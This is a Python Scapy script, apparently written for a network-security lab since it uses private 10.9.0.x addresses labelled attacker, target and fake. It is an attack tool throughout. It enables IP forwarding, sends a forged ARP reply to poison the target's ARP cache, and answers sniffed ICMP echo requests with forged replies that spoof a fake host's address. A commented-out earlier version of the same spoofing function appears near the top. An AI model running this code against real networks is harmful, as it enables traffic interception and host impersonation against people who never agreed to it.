from scapy.all import *
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import Ether, ARP

# Define the IP address of attacker machine
attacker_ip = "10.9.0.1"

# Define the IP address of the target machine
target_ip = "10.9.0.6"

# Define the IP address of the fake machine
fake_ip = "10.9.0.5"

# Define the function to sniff and spoof packets
# def sniff_and_spoof(pkt):
#     # Check if the packet is an ICMP echo
#     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
#         print("got request")
#         # Create a new packet with the spoofed source IP address
#         spoofed_pkt = IP(src=fake_ip, dst=target_ip) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / pkt[Raw].load
#         # Send the spoofed packet
#         send(spoofed_pkt)
#         print("sent spoof")
#         # Print a message to indicate that a packet has been spoofed
#         print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
#
#
# if __name__ == "__main__":
#     # Start sniffing packets on the LAN
#     print("Start Snoofing...")
#     packets = sniff(filter="icmp", prn=sniff_and_spoof, iface="lo")
# wrpcap(packets, "snoofer_packets")

import socket

def sniff_and_spoof(pkt):
    # Check if the packet is an ICMP echo
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        print("Got request")
        # Drop the original packet by not forwarding it

        # Create a new packet with the spoofed source IP address
        spoofed_pkt = IP(src=fake_ip, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / pkt[Raw].load
        # Send the spoofed packet
        send(spoofed_pkt, verbose=False)
        print("Sent spoof")
        # Print a message to indicate that a packet has been spoofed
        print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))


if __name__ == "__main__":
    # Enable IP forwarding
    os.system("sysctl -w net.ipv4.ip_forward=1")

    # Perform ARP spoofing to intercept packets
    arp = ARP(op=2, psrc=fake_ip, pdst=target_ip)
    send(arp, verbose=False)

    # Start sniffing and spoofing packets
    print("Start Sniffing...")
    sniff(filter="icmp", prn=sniff_and_spoof)
